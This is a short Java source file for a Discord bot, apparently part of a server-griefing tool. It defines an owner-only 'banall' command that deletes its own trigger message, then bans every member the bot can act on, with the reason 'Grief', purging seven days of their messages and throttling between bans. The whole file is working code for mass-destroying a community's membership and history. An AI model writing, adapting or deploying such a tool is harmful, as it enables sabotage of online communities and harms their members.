package com.visions.dev.Commands;

import com.jagrosh.jdautilities.command.Command;
import com.jagrosh.jdautilities.command.CommandEvent;

import java.util.concurrent.TimeUnit;

public class BanAllCommand extends Command {

    public BanAllCommand() {
        this.name = "banall";
        this.ownerCommand = true;
        this.guildOnly = false;
    }

    protected void execute(CommandEvent event) {

        event.getMessage().delete().queue();
        event.getGuild().loadMembers(member -> {
            if (event.getGuild().getSelfMember().canInteract(member)) {
                member.ban(7, "Grief").queue();
                try {
                    TimeUnit.MILLISECONDS.sleep(100);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
    }
}
